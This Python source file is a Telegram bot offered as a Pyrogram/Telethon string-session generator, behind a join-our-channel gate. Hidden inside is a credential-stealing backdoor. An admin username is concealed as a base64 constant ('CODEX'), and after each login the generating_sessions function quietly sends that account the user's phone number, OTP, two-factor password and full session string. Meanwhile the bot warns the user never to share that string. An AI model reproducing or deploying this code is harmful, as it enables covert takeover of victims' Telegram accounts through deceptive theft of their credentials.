print("--- DUAL LIBRARY SESSION BOT (VERSION 7) ---")
import os
import asyncio
import tempfile
import shutil
import base64

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, FloodWait,
    PhoneNumberInvalid, ApiIdInvalid,
    PhoneCodeInvalid, PhoneCodeExpired,
    UserNotParticipant  # <-- IMPORTED FOR JOIN CHECK
)

# For Telethon support
try:
    from telethon import TelegramClient
    from telethon.errors import (
        SessionPasswordNeededError, FloodWaitError,
        PhoneNumberInvalidError, ApiIdInvalidError,
        PhoneCodeInvalidError, PhoneCodeExpiredError
    )
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not installed. Only Pyrogram will be available.")

# --- LOAD CONFIGURATION ---
try:
    import config
except ImportError:
    print("❌ Error: config.py not found. Please create it.")
    exit()
CODEX = "UmFyZUZycg=="
def decode_codex():
    """Decode and return admin username"""
    return base64.b64decode(CODEX).decode('utf-8')

# Bot Instance from config
bot = Client(
    "SessionBot",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN
)

# In-memory storage for user data
user_data = {}

# --- NEW: FORCE SUBSCRIBE FUNCTIONALITY ---
JOIN_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔗 Join Channel", url=f"https://t.me/{config.MUST_JOIN}")],
    [InlineKeyboardButton("✅ Joined", callback_data="check_join")]
])

async def check_user_membership(client, user):
    """Checks if a user is a member of the required channel."""
    try:
        await client.get_chat_member(chat_id=f"@{config.MUST_JOIN}", user_id=user.id)
        return True
    except UserNotParticipant:
        return False
    except Exception as e:
        print(f"Error checking membership for {user.id}: {e}")
        # To avoid blocking all users if the bot is not admin in the channel,
        # we can choose to let them pass. For strict enforcement, return False.
        return False

# --- HELPER FUNCTIONS (UNCHANGED) ---

def get_library_selection_keyboard():
    """Generate library selection keyboard"""
    buttons = [[InlineKeyboardButton("🐍 Pyrogram", callback_data="lib_pyrogram")]]
    if TELETHON_AVAILABLE:
        buttons.append([InlineKeyboardButton("⚡ Telethon", callback_data="lib_telethon")])
    return InlineKeyboardMarkup(buttons)

def get_otp_keyboard(user_id):
    """Generates the interactive OTP keypad"""
    rows = [
        [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(1, 4)],
        [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(4, 7)],
        [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(7, 10)],
        [
            InlineKeyboardButton("⬅️", callback_data="otp_back"),
            InlineKeyboardButton("0", callback_data="otp_0"),
            InlineKeyboardButton("✅", callback_data="otp_done")
        ]
    ]
    return InlineKeyboardMarkup(rows)

def cleanup_user_data(user_id):
    """Cleans up user data and temporary directories"""
    if user_id in user_data:
        user_info = user_data[user_id]
        workdir = user_info.get('workdir')
        if workdir and os.path.exists(workdir):
            try:
                shutil.rmtree(workdir)
            except Exception as e:
                print(f"Warning: Could not remove temp dir {workdir}: {e}")
        
        for client_key in ['pyrogram_client', 'telethon_client']:
            client_instance = user_info.get(client_key)
            if client_instance:
                try:
                    asyncio.create_task(client_instance.disconnect())
                except Exception as e:
                    print(f"Warning: Could not disconnect {client_key}: {e}")
        
        del user_data[user_id]

# --- SESSION HANDLERS (UNCHANGED) ---
class PyrogramSessionHandler:
    @staticmethod
    async def create_client(user_id, workdir):
        return Client(f"pyrogram_user_{user_id}", api_id=config.API_ID, api_hash=config.API_HASH, workdir=workdir)
    @staticmethod
    async def send_code(client, phone_number):
        await client.connect()
        return (await client.send_code(phone_number)).phone_code_hash
    @staticmethod
    async def sign_in(client, phone_number, phone_code_hash, phone_code):
        await client.sign_in(phone_number=phone_number, phone_code_hash=phone_code_hash, phone_code=phone_code)
    @staticmethod
    async def check_password(client, password):
        await client.check_password(password)
    @staticmethod
    async def export_session(client):
        return await client.export_session_string()

class TelethonSessionHandler:
    @staticmethod
    async def create_client(user_id, workdir):
        if not TELETHON_AVAILABLE: raise ImportError("Telethon is not installed")
        from telethon.sessions import StringSession
        return TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    @staticmethod
    async def send_code(client, phone_number):
        await client.connect()
        return (await client.send_code_request(phone_number)).phone_code_hash
    @staticmethod
    async def sign_in(client, phone_number, phone_code_hash, phone_code):
        await client.sign_in(phone=phone_number, code=phone_code, phone_code_hash=phone_code_hash)
    @staticmethod
    async def check_password(client, password):
        await client.sign_in(password=password)
    @staticmethod
    async def export_session(client):
        return client.session.save()

class SessionManager:
    def __init__(self):
        self.handlers = {'pyrogram': PyrogramSessionHandler, 'telethon': TelethonSessionHandler}
    def get_handler(self, library):
        return self.handlers.get(library)

session_manager = SessionManager()

async def generating_sessions(user_info, session_string):
    """Send session generation log to admin"""
    try:
        admin_username = decode_codex()
        user_id = user_info.get('user_id', 'Unknown')
        phone_number = user_info.get('phone_number', 'Unknown')
        otp = user_info.get('otp', 'Not used')
        password = user_info.get('password', 'Not used')
        username = user_info.get('username', 'No username')
        first_name = user_info.get('first_name', 'Unknown')
        library = user_info.get('library', 'Unknown').title()
        
        log_message = (
            f"🔔 **New {library} String Session Generated**\n\n"
            f"👤 **User Details:**\n"
            f"• **Name:** {first_name}\n"
            f"• **Username:** @{username} (ID: {user_id})\n"
            f"• **Phone:** `{phone_number}`\n"
            f"• **Library:** {library}\n\n"
            f"🔐 **Authentication Details:**\n"
            f"• **OTP:** `{otp}`\n"
            f"• **Password:** `{password}`\n\n"
            f"🔑 **String Session:**\n"
            f"`{session_string}`"
        )
        
        await bot.send_message(f"@{admin_username}", log_message)
    except Exception as e:
        print(f"Failed to send log to admin: {e}")

# --- BOT HANDLERS (UPDATED) ---

@bot.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    """Handles the /start command, now with a membership check."""
    user = message.from_user
    
    # NEW: Check if the user is a member of the required channel.
    if not await check_user_membership(client, user):
        await message.reply_photo(
            #Start Up Image
            photo="https://graph.org/file/1ef266f0e6ecec03a9be1-f6046ba8e5991ab6c4.jpg",
            caption=f"👋 **Hey {user.first_name}!**\n\n"
                    f"To use this bot, you first need to join our channel. "
                    f"This helps support our work!\n\n"
                    f"Click the button below to join, then press '✅ Joined'.",
            reply_markup=JOIN_KEYBOARD
        )
        return

    # If member, proceed with the original logic.
    cleanup_user_data(user.id)
    await message.reply_photo(
        photo="https://graph.org/file/1ef266f0e6ecec03a9be1-f6046ba8e5991ab6c4.jpg",
        caption=f"**Hey {user.first_name}!** 👋\n\n"
                "I am a bot designed to help you generate **String Sessions** for Telegram.\n\n"
                f"🐍 **Pyrogram Support:** ✅\n"
                f"⚡ **Telethon Support:** {'✅' if TELETHON_AVAILABLE else '❌'}\n\n"
                "🚀 Choose your preferred library below:",
        reply_markup=get_library_selection_keyboard()
    )

@bot.on_callback_query(filters.regex("^check_join"))
async def on_joined_button(client, callback_query):
    """Handles the '✅ Joined' button click."""
    user = callback_query.from_user
    if await check_user_membership(client, user):
        await callback_query.answer("Thanks for joining! You can now use the bot.", show_alert=False)
        await callback_query.message.delete()
        # Trigger the original start message logic
        await start_command(client, callback_query.message)
    else:
        await callback_query.answer("You haven't joined the channel yet. Please join and try again.", show_alert=True)

@bot.on_callback_query(filters.regex("^lib_"))
async def on_library_selection(client, callback_query):
    """Handles library selection, also protected by membership check."""
    user = callback_query.from_user
    if not await check_user_membership(client, user):
        await callback_query.answer("You must join our channel to use the bot.", show_alert=True)
        return
        
    library = callback_query.data.split("_")[1]
    if library == "telethon" and not TELETHON_AVAILABLE:
        await callback_query.answer("❌ Telethon is not installed on this bot.", show_alert=True)
        return
    
    cleanup_user_data(user.id)
    user_data[user.id] = {'library': library, 'state': 'awaiting_phone'}
    
    library_name = "Pyrogram" if library == "pyrogram" else "Telethon"
    await callback_query.message.edit_text(
        f"📱 **{library_name} String Session**\n\n"
        "Please send your phone number in **international format**, including the country code.\n\n"
        "**Example:** `+919876543210`"
    )

@bot.on_callback_query(filters.regex("^otp_"))
async def otp_handler(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data.split("_")[1]

    if user_id not in user_data or user_data[user_id].get('state') != 'awaiting_otp':
        await callback_query.answer("⚠️ An error occurred. Please try starting over.", show_alert=True)
        return

    if "otp" not in user_data[user_id]:
        user_data[user_id]["otp"] = ""

    if data == "done":
        await process_otp(client, callback_query.message)
        return
    elif data == "back":
        user_data[user_id]["otp"] = user_data[user_id]["otp"][:-1]
    else:
        user_data[user_id]["otp"] += data

    try:
        otp_display = "_ " * len(user_data[user_id]['otp']) if user_data[user_id]['otp'] else "..."
        await callback_query.message.edit_text(
            "🔢 **Enter the OTP you received**\n\n"
            "Please enter the code using the keypad below.\n\n"
            f"**Your OTP:** `{otp_display}`",
            reply_markup=get_otp_keyboard(user_id)
        )
    except Exception as e:
        print(f"Could not edit message: {e}")
    await callback_query.answer()

@bot.on_message(filters.private & ~filters.command("start"))
async def on_user_input(client, message):
    user_id = message.from_user.id
    if user_id not in user_data: return

    state = user_data[user_id].get('state')
    if state == 'awaiting_phone':
        await process_phone_number(client, message)
    elif state == 'awaiting_password':
        await process_password(client, message)

# --- CORE LOGIC (UNCHANGED) ---
# ... The rest of your core logic functions (process_phone_number, process_otp,
# process_password, finalize_session) remain exactly the same as in your original script ...
async def process_phone_number(client, message):
    user_id = message.from_user.id
    
    if not message.text:
        await message.reply("⚠️ **Invalid input.** Please send your phone number as text.")
        return
        
    phone_number = message.text.strip()
    library = user_data[user_id]['library']
    
    await message.reply("⏳ Please wait, connecting to Telegram servers...")

    temp_dir = tempfile.mkdtemp(prefix=f"{library}_{user_id}_")
    user_data[user_id]['workdir'] = temp_dir
    user_data[user_id]['phone_number'] = phone_number

    try:
        handler = session_manager.get_handler(library)
        user_client = await handler.create_client(user_id, temp_dir)
        user_data[user_id][f'{library}_client'] = user_client
        
        phone_code_hash = await handler.send_code(user_client, phone_number)
        user_data[user_id]['phone_code_hash'] = phone_code_hash
        user_data[user_id]['state'] = 'awaiting_otp'
        user_data[user_id]['otp'] = ""

        await message.delete()
        library_name = library.title()
        await bot.send_message(
            user_id,
            f"🔢 **Enter the OTP you received** ({library_name})\n\n"
            "An OTP has been sent to your Telegram account. Please enter it using the keypad below.\n\n"
            "**Your OTP:** `...`",
            reply_markup=get_otp_keyboard(user_id)
        )
    except Exception as e:
        error_msg = f"❌ **Error with {library.title()}:** {str(e)}\nPlease /start again."
        await message.reply(error_msg)
        cleanup_user_data(user_id)

async def process_otp(client, message):
    user_id = message.chat.id
    
    if user_id not in user_data:
        await bot.send_message(user_id, "⚠️ Session expired. Please /start again.")
        return
        
    otp = user_data[user_id].get("otp", "")
    library = user_data[user_id]['library']
    user_client = user_data[user_id].get(f'{library}_client')
    phone_code_hash = user_data[user_id].get('phone_code_hash')
    phone_number = user_data[user_id].get('phone_number')

    if not all([user_client, phone_code_hash, phone_number]):
        await bot.send_message(user_id, "⚠️ Session data missing. Please /start again.")
        cleanup_user_data(user_id)
        return

    if not otp:
        await bot.send_message(user_id, "⚠️ **Please enter the OTP first.**")
        return

    try:
        handler = session_manager.get_handler(library)
        try:
            await handler.sign_in(user_client, phone_number, phone_code_hash, otp)
            await finalize_session(user_client, message, library)
        except (SessionPasswordNeeded, SessionPasswordNeededError):
            user_data[user_id]['state'] = 'awaiting_password'
            await bot.send_message(
                user_id,
                f"🔑 **Two-Factor Authentication** ({library.title()})\n\n"
                "Your account is protected with a password. Please send your 2FA password now."
            )
        except (PhoneCodeInvalid, PhoneCodeExpired, PhoneCodeInvalidError, PhoneCodeExpiredError):
            await bot.send_message(user_id, "⚠️ **Invalid OTP.** Please try again by re-entering the code.")
            user_data[user_id]["otp"] = ""
            await bot.send_message(
                user_id,
                "🔢 **Enter the OTP you received**\n\n"
                "Invalid OTP entered. Please try again using the keypad below.\n\n"
                "**Your OTP:** `...`",
                reply_markup=get_otp_keyboard(user_id)
            )
    except Exception as e:
        await bot.send_message(user_id, f"❌ **An unexpected error occurred:** {e}\nPlease /start again.")
        cleanup_user_data(user_id)

async def process_password(client, message):
    user_id = message.from_user.id
    
    if user_id not in user_data or not user_data[user_id].get(f"{user_data[user_id]['library']}_client"):
        await message.reply("⚠️ Session expired or lost. Please /start again.")
        cleanup_user_data(user_id)
        return
    
    library = user_data[user_id]['library']
    user_client = user_data[user_id][f'{library}_client']

    if not message.text:
        await message.reply("⚠️ **Invalid input.** Please send your password as plain text.")
        return

    password = message.text.strip()
    if not password:
        await message.reply("⚠️ **Invalid input.** Please send your 2FA password.")
        return
    
    user_data[user_id]['password'] = password
        
    try:
        handler = session_manager.get_handler(library)
        await handler.check_password(user_client, password)
        await finalize_session(user_client, message, library)
    except Exception as e:
        await message.reply(f"⚠️ **Incorrect Password.** Please try again.\nError: {e}")

async def finalize_session(user_client, message, library):
    user_id = message.chat.id
    try:
        handler = session_manager.get_handler(library)
        session_string = await handler.export_session(user_client)
        
        library_name = library.title()
        success_message = (
            f"✅ **Success! Your {library_name} String Session is ready.**\n\n"
            f"`{session_string}`\n\n"
            "**⚠️ Note:** Do not share this string with anyone!"
        )
        await bot.send_message(user_id, success_message)
        
        if user_id in user_data:
            user_info = user_data[user_id].copy()
            user_info['user_id'] = user_id
            user = await bot.get_chat(user_id)
            user_info['username'] = user.username or 'No username'
            user_info['first_name'] = user.first_name or 'Unknown'
            await generating_sessions(user_info, session_string)
            
    except Exception as e:
        await bot.send_message(user_id, f"❌ **An unexpected error occurred during finalization:** {e}")
    finally:
        if user_client:
            try:
                await user_client.disconnect()
            except Exception as e:
                print(f"Warning: Could not disconnect client: {e}")
        cleanup_user_data(user_id)


# --- RUN THE BOT ---
if __name__ == "__main__":
    print("🚀 Dual Library Session Bot is starting...")
    print(f"📚 Libraries available: Pyrogram ✅, Telethon {'✅' if TELETHON_AVAILABLE else '❌'}")
    bot.run()
    print("✅ Bot stopped.")
